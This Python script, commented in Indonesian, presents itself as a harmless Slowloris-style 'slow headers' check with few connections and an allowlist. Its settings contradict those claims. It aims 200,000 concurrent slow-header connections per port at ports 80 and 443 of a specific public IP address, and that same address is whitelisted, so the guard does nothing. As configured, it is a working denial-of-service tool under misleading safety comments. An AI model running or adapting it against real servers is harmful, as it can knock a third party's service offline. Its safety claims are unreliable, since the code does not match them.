#!/usr/bin/env python3
"""
http_slowloris_check.py
Cek ringan perilaku server terhadap "slow headers" (gaya Slowloris)
- Koneksi sangat sedikit & berdurasi pendek (aman)
- Tanpa membanjiri server; hanya observasi timeout/penutupan koneksi
- Gunakan hanya untuk host milikmu/berizin (ALLOWLIST diterapkan)

Stdlib only: socket, ssl, time, threading
"""

import socket, ssl, time, threading, random, sys, ipaddress
from urllib.parse import urlparse

# ========= KONFIGURASI =========
TARGET         = "http://139.99.61.184"  # bisa http://IP atau http(s)://domain
PATH           = "/"                      # path yang diminta di baris pertama
PORTS          = [80, 443]                # port yang dicek
CONNS_PER_PORT = 200000                        # koneksi paralel per port (kecil saja)
DURATION_SEC   = 300                       # durasi observasi maksimal
INTERVAL_SEC   = 50                        # jeda antar header "dummy"
CONNECT_TIMEOUT= 1000000                       # detik
SOCKET_TIMEOUT = 100                     # detik (read/send timeout)

# ALLOWLIST IP publik
ALLOWLIST = {
    "139.99.61.184",
}

# ========= UTIL =========
def is_ip(host: str) -> bool:
    try:
        ipaddress.ip_address(host); return True
    except ValueError:
        return False

def resolve_host(host: str) -> str:
    if is_ip(host):
        return host
    return socket.gethostbyname(host)

def ensure_allowed(host: str):
    ip = resolve_host(host)
    ipobj = ipaddress.ip_address(ip)
    is_public = not (ipobj.is_private or ipobj.is_loopback or ipobj.is_link_local)
    if is_public and ip not in ALLOWLIST:
        print(f"[STOP] Target {ip} adalah IP publik dan tidak ada di ALLOWLIST.")
        sys.exit(1)

# ========= CORE =========
class ConnResult:
    def __init__(self, port):
        self.port = port
        self.started_at = time.time()
        self.closed_at = None
        self.error = None
        self.sent_lines = 0

    @property
    def duration(self):
        end = self.closed_at if self.closed_at else time.time()
        return max(0.0, end - self.started_at)

def make_socket(host: str, port: int):
    s = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
    s.settimeout(SOCKET_TIMEOUT)
    return s

def wrap_tls_if_needed(sock, host: str, port: int, scheme: str):
    if scheme == "https" or port == 443:
        ctx = ssl.create_default_context()
        # Non-verifying: kita hanya observasi perilaku, bukan validasi cert
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        server_hostname = host if not is_ip(host) else None
        sock = ctx.wrap_socket(sock, server_hostname=server_hostname)
    return sock

def send_slow_headers(host_header: str, sock, res: ConnResult, end_ts: float):
    # Baris awal + header wajib, TANPA CRLF ganda di akhir
    first = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"User-Agent: slowloris-check/0.1\r\n"
    ).encode("ascii", "ignore")

    try:
        sock.sendall(first)
        res.sent_lines += 3
    except Exception as e:
        res.error = f"send first: {e}"
        return

    # Kirim header dummy kecil tiap INTERVAL_SEC
    while time.time() < end_ts:
        line = f"X-Dummy-{random.randint(1000,9999)}: {random.randint(0,999999)}\r\n".encode("ascii", "ignore")
        try:
            sock.sendall(line)
            res.sent_lines += 1
            # Coba baca non-blocking sedikit untuk mendeteksi pemutusan sisi server
            try:
                sock.settimeout(0.001)
                if sock.recv(1):
                    # Kalau server tiba-tiba kirim respons, berarti ia menutup/merespons
                    pass
            except socket.timeout:
                pass
            finally:
                sock.settimeout(SOCKET_TIMEOUT)
        except (BrokenPipeError, ConnectionResetError, ssl.SSLError, OSError) as e:
            res.closed_at = time.time()
            res.error = f"closed: {e.__class__.__name__}"
            return
        time.sleep(INTERVAL_SEC)

def worker(host: str, port: int, scheme: str, result_list: list, end_ts: float):
    res = ConnResult(port)
    result_list.append(res)
    try:
        s = make_socket(host, port)
        s = wrap_tls_if_needed(s, host, port, scheme)
        send_slow_headers(host, s, res, end_ts)
    except Exception as e:
        res.error = f"connect/error: {e}"
    finally:
        try:
            s.close()
        except Exception:
            pass
        if not res.closed_at:
            # kalau masih terbuka sampai selesai durasi
            res.closed_at = time.time()

def summarize(results: list, port: int):
    kept = [r for r in results if r.port == port and r.error is None and r.duration >= DURATION_SEC - 0.5]
    early= [r for r in results if r.port == port and (r.error or r.duration < DURATION_SEC - 0.5)]
    print(f"\n[PORT {port}] connections: {len([r for r in results if r.port==port])}")
    print(f"  - kept open >= {DURATION_SEC}s : {len(kept)}")
    if early:
        med = sorted(r.duration for r in early)[len(early)//2]
        print(f"  - closed early                : {len(early)} (median close at ~{med:.1f}s)")
    # Catatan interpretasi
    if kept:
        print("  * Interpretasi: server menoleransi header lambat cukup lama.")
        print("    Periksa/ketatkan: client_header_timeout / read_header_timeout, rate/conn limit per IP.")
    else:
        print("  * Interpretasi: server menutup koneksi cepat (mitigasi header timeout tampak aktif).")

def main():
    u = urlparse(TARGET)
    scheme = u.scheme or "http"
    host = u.hostname or u.path  # simple parse untuk 'http://ip'
    if not host:
        print("[STOP] TARGET tidak valid."); sys.exit(1)

    ensure_allowed(host)
    ip = resolve_host(host)
    print(f"Target: {host} ({ip}) | path={PATH}")
    print(f"Durasi: {DURATION_SEC}s | interval header: {INTERVAL_SEC}s | conns/port: {CONNS_PER_PORT}")

    end_ts = time.time() + DURATION_SEC
    results = []
    threads = []

    for port in PORTS:
        for _ in range(CONNS_PER_PORT):
            t = threading.Thread(target=worker, args=(host, port, scheme, results, end_ts), daemon=True)
            t.start()
            threads.append(t)

    try:
        while time.time() < end_ts:
            time.sleep(0.2)
    except KeyboardInterrupt:
        print("\n[INFO] Dihentikan oleh user.")

    # join sebentar
    for t in threads:
        t.join(timeout=1.0)

    # Ringkasan per port
    for p in PORTS:
        summarize(results, p)

    # Detail ringan
    print("\nDetail koneksi:")
    for r in results:
        status = "kept_to_end" if (r.error is None and r.duration >= DURATION_SEC - 0.5) else (r.error or "closed")
        print(f"  - port {r.port}: duration={r.duration:.1f}s, sent_lines={r.sent_lines}, status={status}")

if __name__ == "__main__":
    main()
